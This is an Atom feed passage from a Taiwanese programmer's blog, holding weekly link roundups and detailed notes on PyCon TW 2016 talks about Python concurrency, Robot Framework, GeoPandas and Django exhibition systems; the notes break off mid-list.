<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>Just for noting</title><link href="https://blog.m157q.tw/" rel="alternate"></link><link href="https://blog.m157q.tw/feeds/tag.conf.atom.xml" rel="self"></link><id>https://blog.m157q.tw/</id><updated>2017-02-06T03:14:33+08:00</updated><entry><title>Y2017W01</title><link href="https://blog.m157q.tw/posts/2017/01/09/y2017w01/" rel="alternate"></link><published>2017-02-06T03:14:33+08:00</published><updated>2017-02-06T03:14:33+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-01-09:posts/2017/01/09/y2017w01/</id><summary type="html">&lt;h3&gt;blog&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.fntsr.tw/articles/2016/12/21/generate-google-drive-dropbox-onedrive-directly-download-link/"&gt;獲取 Google Drive, Dropbox, OneDrive 中檔案直接下載的連結 - 深藏若虛&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「筆者現在工作場所連接影印機的電腦仍是 Windows XP 搭配 IE6，無法下載要影印的文件下來。」  &lt;/li&gt;
&lt;li&gt;感覺有了這篇文章的整理就可以寫個 script 解決這件事啦  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;cs&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.slideshare.net/ccckmit/ss-70707797"&gt;《計算機結構與作業系統裡》-- 資工系學生們經常搞錯的那些事兒！&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;算是釐清了一些自己沒懂的部份  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;javascript&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/ryanmcdermott/clean-code-javascript"&gt;GitHub - ryanmcdermott/clean-code-javascript: Clean Code concepts adapted for JavaScript&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;JavaScript 版本的 Clean Code  &lt;/li&gt;
&lt;li&gt;分享給寫 JavaScript 的同事之後，他說這篇真的還挺不錯的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;job&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/gossiping/M.1483435954.A.307.html"&gt;[新聞] 【獨家】翟本喬公司員工爆 年前大裁員 - 看板 Gossiping - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「員工透露，公司疑似因周轉不靈、錢進不來，幾乎要倒閉，所以才會在農曆年前突然大規模裁員，人數將近8成，全公司大約110至120人左右，裁員後，將只剩下2個核心小組成員。」  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.facebook.com/denny.ku1/posts/1226657567387696"&gt;Denny Ku - 最近新聞提到我之前任職的公司和沛科技年前裁員，網路上有各種說法都跑出來，... | Facebook&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「落井下石很容易，但在這個時代失敗和成功都是暫時的。」  &lt;/li&gt;
&lt;li&gt;簡單來說就是跟酸民認真就輸了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programmer&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://stackshare.io/posts/top-developer-tools-2016"&gt;The Top 50 Developer Tools of 2016 | StackShare&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;總共分成五類，各取了前十名。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.pythonlearn.com/index.php"&gt;Python for Everybody: Exploring Data in Python 3&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/naftaliharris/placeholder"&gt;GitHub - naftaliharris/placeholder: Fork of Python 2.7 with new syntax, builtins, and libraries backported from Python 3.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;本來叫 Python 2.8 XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pypa/pipfile"&gt;GitHub - pypa/pipfile&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;a new (and much better!) replacement for the existing standard pip's requirements.txt file.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/google/grumpy"&gt;GitHub - google/grumpy: Grumpy is a Python to Go source code transcompiler and runtime.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Grumpy is a Python to Go source code transcompiler and runtime that is intended to be a near drop in replacement for CPython. The key difference is that it compiles Python source code to Go source code which is then compiled to native code, rather than to bytecode. This means that Grumpy has no VM.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;沒錯，就是字面上的意思，人只要寫 Python 再用 Grumpy 幫你轉成 golang，一切都是為了效能啊  &lt;/li&gt;
&lt;li&gt;不過目前仍然還沒有很成熟，加上有些限制。  &lt;ul&gt;
&lt;li&gt;不支援 &lt;code&gt;exec&lt;/code&gt;, &lt;code&gt;eval&lt;/code&gt;, &lt;code&gt;compile&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;不支援 C extension modules  &lt;/li&gt;
&lt;li&gt;還有許多預計會支援但目前還沒支援的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://opensource.googleblog.com/2017/01/grumpy-go-running-python.html"&gt;Google Open Source Blog: Grumpy: Go running Python!&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Grumpy is an experimental Python runtime for Go. It translates Python code into Go programs, and those transpiled programs run seamlessly within the Go runtime.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://bola.gov.taipei/ct.asp?xItem=94627869&amp;amp;ctNode=76327&amp;amp;mp=116003"&gt;臺北市政府勞動局 ─ 違反勞動基準法事業單位&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;台灣 Yahoo、台灣 Oracle、台灣大學、中央研究院上榜  OAO  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;trivia&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.facebook.com/photo.php?fbid=1720330024659355&amp;amp;set=a.150639711628402.36958.100000471228657&amp;amp;type=3&amp;amp;theater"&gt;葉丙成 - 【魂斗羅名字由來，你知否？】... | Facebook&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「魂斗羅」三字的漢字日語發音是「コントラ」，也是它的英文名字 Contra 的日語發音。  &lt;/li&gt;
&lt;li&gt;Contras 是 1980 年代活躍於尼加拉瓜反桑定左翼政權的反革命游擊隊的稱呼。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;life&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=5K7cNWJfxMY"&gt;亞當潑冷水：電動車並沒有比較環保 - College Humor - YouTube&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「如果你不留意，這些公司會利用你想幫助地球的想法，來賣你更多傷害地球的東西。購買綠能產品並不能解決問題，因為購買本身就是個問題。我們要降低購買的數量，並重複使用現有的東西。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=KsGiDrt5U2c"&gt;千禧世代在職場上到底出了什麼問題?  - Simon Sinek 賽門.西奈克 - YouTube&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;身為千禧世代的一份子，我覺得這個訪談鞭辟入裡啊。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;misc&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.mobile01.com/newsdetail/20372/ces-2017-honda-motorcycle-riding-assist-technology"&gt;[CES 2017快訊]重機會自己平衡了！Honda 本田發表全自體平衡技術 『Honda Riding Assist』 - Mobile01&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;哇賽 有點神  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="blog"></category><category term="conf"></category><category term="cs"></category><category term="javascript"></category><category term="job"></category><category term="life"></category><category term="misc"></category><category term="programmer"></category><category term="python"></category><category term="taiwan"></category><category term="trivia"></category></entry><entry><title>Y2016W52</title><link href="https://blog.m157q.tw/posts/2017/01/02/y2016w52/" rel="alternate"></link><published>2017-02-06T02:57:17+08:00</published><updated>2017-02-06T02:57:17+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-01-02:posts/2017/01/02/y2016w52/</id><summary type="html">&lt;h3&gt;conf&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://hackaday.com/2016/12/30/33c3-works-for-me/"&gt;33C3: Works for Me | Hackaday&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;The Chaos Communication Congress (CCC) is the largest German hacker convention by a wide margin, and it’s now in its thirty-third year, hence 33C3. The Congress is a techno-utopian-anarchist-rave with a social conscience and a strong underpinning of straight-up hacking.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;一篇詳細介紹 33C3 的文章，真的是個很棒的 conference。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;opensource&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://tonghuix.io/2016/12/diff-china-taiwan-osc/"&gt;两岸开源社群面面观（总结篇） – FOSS Geek | 爱开源魅影&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇也介紹的非常詳細，也很一針見血得點出了許多有關台灣開源社群可以改進和反省的部份，真的是篇值得一看的好文章。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programmer&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://mp.weixin.qq.com/s?__biz=MjM5MDE0Mjc4MA%3D%3D&amp;amp;mid=2650995135&amp;amp;idx=1&amp;amp;sn=758336ff3ecbfdc239d80a11a7122344&amp;amp;chksm=bdbf01ec8ac888fa1c24d310bb34ca257c4ba06e3d92a1d32d05803498e10624d0c525c1cc59&amp;amp;mpshare=1&amp;amp;scene=4&amp;amp;srcid=1229DBPu7JoSaH9bYLxIN3Ta#rd"&gt;左耳朵耗子：不灌鸡汤，说真的年龄渐长，技术人的发展之路该怎么走？&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;年底真的出現好多值得邊看邊自省的好文章啊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://jakevdp.github.io/blog/2014/05/09/why-python-is-slow/"&gt;Why Python is Slow: Looking Under the Hood&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;滿詳細介紹 Python 效能不好的一篇文章  &lt;/li&gt;
&lt;li&gt;但，沒有講到 GIL，沒錯，沒有講到 GIL，通常看到說 Python 效能差的文章，幾乎一定會講到 GIL，也可能是作者覺得這個已經講到爛掉了吧。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="conf"></category><category term="opensource"></category><category term="programmer"></category><category term="python"></category></entry><entry><title>PyCon TW 2016</title><link href="https://blog.m157q.tw/posts/2016/06/03/pycon-tw-2016/" rel="alternate"></link><published>2016-06-05T23:22:00+08:00</published><updated>2016-06-05T23:22:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-06-03:posts/2016/06/03/pycon-tw-2016/</id><summary type="html">&lt;p&gt;Really appreciate &lt;a href="http://eldarion.com/"&gt;eldarion&lt;/a&gt; gave me the free sponsored ticket or I could not attend this biggest annual Python event in Taiwan.  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://tw.pycon.org/2016/"&gt;官網&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://hackfoldr.org/pycontw2016"&gt;官方共筆&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://gitter.im/pycontw/2016"&gt;官方聊天室&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.flickr.com/photos/pycon_tw_2016/"&gt;官方相簿&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/channel/UCHLnNgRnfGYDzPCCH8qGbQw"&gt;直播頻道&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Day 1 (2016/06/03 Fri)&lt;/h1&gt;
&lt;hr /&gt;
&lt;h2&gt;Keynote: The world after tomorrow by au（唐鳳）&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;與 Python 第一次接觸：2003 年，在台灣，Perl, Python, PHP 三個沒有大公司支撐的語言辦了個 Conf，沒想到反應熱烈，成為 OSDC.tw 的前身，直到 2014 年 OSDC 停辦。  &lt;/li&gt;
&lt;li&gt;Perl 5：很多設計都是從 Python 的 pep 抄來  &lt;/li&gt;
&lt;li&gt;用 Open Source 參與公民社會：318, g0v  &lt;/li&gt;
&lt;li&gt;報導者：開源媒體  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;R2: Strategies for concurrency and parallelism in Python by 洪鈺庭&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Synchronous Model  &lt;ul&gt;
&lt;li&gt;一次執行一個 task  &lt;/li&gt;
&lt;li&gt;最常用，最簡單，最直覺  &lt;/li&gt;
&lt;li&gt;Demo  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;voice.RSS.TexttoSpeechAPI&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;並沒有用到 concurrency 的概念  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Multi-threading  &lt;ul&gt;
&lt;li&gt;不一樣的 thread 可以 share 同一個 memory space  &lt;/li&gt;
&lt;li&gt;create 一個 queue 再從 queue 拿出來  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;GIL in Python  &lt;ul&gt;
&lt;li&gt;同一個時間只會讓一個 thread 執行  &lt;/li&gt;
&lt;li&gt;因為有些 Lib 不是 thread safe，所以直接做限制  &lt;/li&gt;
&lt;li&gt;不是所有 Python 的實作都有 GIL, CPython 有，但像 Jython 和 IronPython 就沒有。  &lt;/li&gt;
&lt;li&gt;既然一次只能執行一個 thread, 為什麼還是比 Synchronous 快呢？  &lt;ul&gt;
&lt;li&gt;因為剛剛的例子是 IO bound, 在等待的時間就可以 switch 到其他 thread 做事情。  &lt;/li&gt;
&lt;li&gt;如果是 CPU bound 的話，multithread 就沒啥太大的優勢，得用 multiprocessing  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Multi-processing  &lt;ul&gt;
&lt;li&gt;建一個 Pool, 然後用 subprocess 去處理事情。  &lt;/li&gt;
&lt;li&gt;對於過於龐大的程式的話，可能會造成 memory over-head.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Distributed Workers  &lt;ul&gt;
&lt;li&gt;把 thread 抽出來，放到另外一個 machine 執行  &lt;/li&gt;
&lt;li&gt;RQ (Redis Queue)  &lt;ul&gt;
&lt;li&gt;A simple Python library backed by Redis for queueing.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;scalibility 會比較好  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Distributed Workers with Cloud Platform Service  &lt;ul&gt;
&lt;li&gt;Iaas  &lt;ul&gt;
&lt;li&gt;自訂性比較高，但管理上會比較麻煩一點。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Paas  &lt;ul&gt;
&lt;li&gt;Instances 的增減 (auto-scaling) 都交由 cloud platform provider 管理，不用自己管。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Q&amp;amp;A 一堆人電講者是怎樣 LOL  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2&gt;R2: Robot Framework: An ATDD Framework by Apua&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;ATDD (Acceptance-test-driven development)  &lt;/li&gt;
&lt;li&gt;Robot Framework 可以做到分散式測試，不只是個 automation tool  &lt;/li&gt;
&lt;li&gt;Acceptance Test  &lt;ul&gt;
&lt;li&gt;Minimal Accpetance Test  &lt;ul&gt;
&lt;li&gt;只取最小的集合，驗證這個產品是他想要的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;End-to-End Acceptance Test  &lt;ul&gt;
&lt;li&gt;把所有能夠想到的測試都跑過一遍。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;把一個很大的 User story 拆解成各種小的 test  &lt;/li&gt;
&lt;li&gt;Behavior driven testing  &lt;ul&gt;
&lt;li&gt;keywords: Given, When, Then  &lt;/li&gt;
&lt;li&gt;keywords 其實就是 function  &lt;/li&gt;
&lt;li&gt;robot framework 可以讓你用 @keyword 來將關鍵字綁定到特定的 function  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;PyBot  &lt;ul&gt;
&lt;li&gt;可以把 keyword 的 traceback show 給你看  &lt;/li&gt;
&lt;li&gt;可以把所有 test cases 都直接 show 出來  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Flow  &lt;/li&gt;
&lt;li&gt;Robot framework 的特性  &lt;ul&gt;
&lt;li&gt;Format  &lt;ul&gt;
&lt;li&gt;支援各種常用格式  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Programmability  &lt;ul&gt;
&lt;li&gt;Limited flow control  &lt;ul&gt;
&lt;li&gt;只有 for loop，沒有 while  &lt;/li&gt;
&lt;li&gt;只能用 ternary operator, 沒有 if else  &lt;/li&gt;
&lt;li&gt;透過嚴格的限制，讓你很難把 test cases 寫的很亂  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;支援把檔案當成是變數  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Hierechical structure  &lt;ul&gt;
&lt;li&gt;Variable files in YAML, Python  &lt;/li&gt;
&lt;li&gt;Resource files to collect keywords and libraries  &lt;/li&gt;
&lt;li&gt;File and directory to organize setup/teardown  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Tagging  &lt;ul&gt;
&lt;li&gt;Category to select  &lt;/li&gt;
&lt;li&gt;Set critical cases  &lt;ul&gt;
&lt;li&gt;可以很容易做到 small test  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;可以自己訂 tag 來做到不同的不同的版本使用不同的測試環境和測資，跟上面的 variable files 做結合。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Documentation  &lt;ul&gt;
&lt;li&gt;支援把 test case 以 docstring 的方式撰寫，讓可維護性提高  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Remote Library  &lt;ul&gt;
&lt;li&gt;遇到把跑測試的環境和測資是分開時，這很好用。  &lt;/li&gt;
&lt;li&gt;使用 XML-RPC protocol  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;其他  &lt;ul&gt;
&lt;li&gt;可以客製化 report  &lt;/li&gt;
&lt;li&gt;IDE support  &lt;/li&gt;
&lt;li&gt;支援自建 keywords  &lt;/li&gt;
&lt;li&gt;有支援使用 API 操作  &lt;/li&gt;
&lt;li&gt;CI Plugin  &lt;ul&gt;
&lt;li&gt;Jenkins  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Third party plugins on pip 也很多  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Summary  &lt;ul&gt;
&lt;li&gt;Robot Framework 提供了很方便的方式讓你可以很快針對需求去撰寫測試。  &lt;/li&gt;
&lt;li&gt;ATDD breakdown story  &lt;ul&gt;
&lt;li&gt;Acceptance test  &lt;/li&gt;
&lt;li&gt;Implement/reuse keyword  &lt;/li&gt;
&lt;li&gt;Automation for testing  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2015/12/31 開始支援 Python 3  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Q&amp;amp;A  &lt;ul&gt;
&lt;li&gt;Parallel PyBot  &lt;ul&gt;
&lt;li&gt;這不確定有沒有疑慮，因為 test cases 最好是循序跑比較好，因為有些可能會有相依性。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Q&amp;amp;A 好熱烈，看來很多人對 testings 都有蠻多疑問和蠻有興趣的。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2&gt;Keynote: Python 導入系統軟體教學 by Jserv&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;20 多年前臺灣走在軟體產業的前端，從辦公軟體到作業系統，沒有什麼是臺灣沒辦法寫的，開源軟體貢獻度大勝亞洲各國；20 多年後，在頂大的創新競賽上，評審教授會跟你說「為什麼不用 ApplePay 就好。」  &lt;/li&gt;
&lt;li&gt;20 年前台灣許多軟體都有人開發，除了作業系統和編譯器沒有以外。  &lt;/li&gt;
&lt;li&gt;15 年前台灣對 Linux 和 BSD 的貢獻是領先亞洲其他國家的。  &lt;/li&gt;
&lt;li&gt;蕭柏納說：「生命不該是支燃燒的蠟燭，燒完就沒。而是一把火炬，應該要努力發光發熱，然後交到下一代的手上。」  &lt;/li&gt;
&lt;li&gt;Nand2Tetris  &lt;/li&gt;
&lt;li&gt;ARRC 前瞻火箭計劃  &lt;/li&gt;
&lt;li&gt;帶學生參與真正的開源計劃，由於貿然投入大型開源計劃的難度是很高的，所以從自己打造比小型但是完整開源系統帶學生做起。然後積極投稿世界一流的 Open Source Conference，讓學生可以被國際看見外，也能夠獲得成就感，並繼續投入到開源的世界中。  &lt;/li&gt;
&lt;li&gt;學生是有熱情的，參與 Open Source 的人也比以前多，但大多數人都是自己玩自己的，學生不知道如何跟人家打群架。  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;R1: From Pandas to GeoPandas by 尼斯&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;GeoPandas == Pandas + GIS  &lt;/li&gt;
&lt;li&gt;台灣常用的座標參考系統  &lt;ul&gt;
&lt;li&gt;WGS84 (Lat/Lon)  &lt;/li&gt;
&lt;li&gt;TWD67 (TM2)  &lt;/li&gt;
&lt;li&gt;TWD97 (TM2)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Shapdefile 的結構  &lt;ul&gt;
&lt;li&gt;.dbf  &lt;/li&gt;
&lt;li&gt;.shp  &lt;ul&gt;
&lt;li&gt;空間的形狀、位置  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;.shx  &lt;ul&gt;
&lt;li&gt;索引  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;.prj  &lt;ul&gt;
&lt;li&gt;投影資訊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Import the GeoPandas  &lt;ul&gt;
&lt;li&gt;結合數值資料並做視覺化  &lt;/li&gt;
&lt;li&gt;為了要 join 兩種資料，必須要做些預處理。（例如：欄位具有資訊，但格式不符合）  &lt;/li&gt;
&lt;li&gt;用 groupby 把某一欄位有相同值的資料排好再使用 aggergation function 將這些資料合併在一起  &lt;/li&gt;
&lt;li&gt;製作區域密度圖  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;情境：忠孝橋引道拆除，要賠償施工範圍半徑 500 公尺內影響到的里的所有里民  &lt;ul&gt;
&lt;li&gt;疊圖分析 (intersection)  &lt;ul&gt;
&lt;li&gt;簡單來說就是把要的資料拿出來，然後取交集，找出目標區域。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;補充（都可在 Jupyter Notebook 進行）  &lt;ul&gt;
&lt;li&gt;Spatial join  &lt;ul&gt;
&lt;li&gt;根據空間的關係去做 join  &lt;/li&gt;
&lt;li&gt;分析住商資料台北市各個里的平均地價  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Folium  &lt;ul&gt;
&lt;li&gt;轉成 GeoJson 後，透過 Folium 顯示出來。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Q&amp;amp;A  &lt;ul&gt;
&lt;li&gt;Open Data 還不夠完善，有時候可以從 Open Street Map 拿到資料。  &lt;/li&gt;
&lt;li&gt;目前只能做 2D 的分析，沒辦法做到 3D 的分析。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;R0: 大型互動展覽的 Python 應用 by 陳炯廷&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;RPi3 上跑 Django 只 run 一支 scanner.py ?  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Rough Prototype =&amp;gt; Auto Update =&amp;gt; More Development  &lt;ul&gt;
&lt;li&gt;開機時執行 Auto Update  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;為什麼要用 Django?  &lt;ul&gt;
&lt;li&gt;有 Admin 介面，不熟悉 Linux 的人也可以進入設定 server 佈署  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;加上一個簡易的 HeartBeat 就可以有個簡易的後台  &lt;/li&gt;
&lt;li&gt;原本預計用 Zeroconf + Avahi 自己找主機，但因為不同的 team 屬於不同的 subnet 而作罷。  &lt;/li&gt;
&lt;li&gt;掃 QR Code 來設定機器  &lt;/li&gt;
&lt;li&gt;全區開機卡  &lt;ul&gt;
&lt;li&gt;pip install wakeonlan  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;全區關機卡  &lt;ul&gt;
&lt;li&gt;收到特定的 UDP 封包就會關機  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Redis PubSub  &lt;ul&gt;
&lt;li&gt;redis-py  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;透過 socket.io-emmitter 這個 Python 套件可以用 Python 跟 socket.io 做溝通  &lt;ul&gt;
&lt;li&gt;但這個套件好像沒在 maintain 了，可能要多花時間嘗試一下。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Django  &lt;ul&gt;
&lt;li&gt;用 django-rest-framework 做簡易的 API 設定  &lt;/li&gt;
&lt;li&gt;用 django-allauth 做手機登入  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;文件用 Sphinx 產生，但總共有四間不同的公司需要 access  &lt;ul&gt;
&lt;li&gt;後來直接把頁面放在 Django 底下，但透過加上 &lt;code&gt;X-Acce-Redirect&lt;/code&gt; Header 讓 file 給 Nginx host，減輕 server 的負擔。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;不要以為把資料丟到 Cloud Platform，就不會有斷線的問題。因為這個才改成比較複雜的架構，但可以在聯外網路斷掉的時候正常運作。  &lt;/li&gt;
&lt;li&gt;展場的供電通常在閉館會斷電，除非有特別要求要 24 小時供電。  &lt;/li&gt;
&lt;li&gt;展場的電腦常放在很難碰到的地方。  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://puredata.info/"&gt;Pure Data&lt;/a&gt; 很難串接 HTTP API，連 parse JSON 都很困難，只好弄一個簡單的 HTTP protocol 來溝通。  &lt;/li&gt;
&lt;li&gt;展場的實體東西只有一座，開展了就是 production，沒辦法分 dev / staging。  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;R0: Boost Maintainbility by Mosky&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.joelonsoftware.com/articles/Wrong.html"&gt;Making wrong code look wrong - Joel on software&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Maintainbility  &lt;ul&gt;
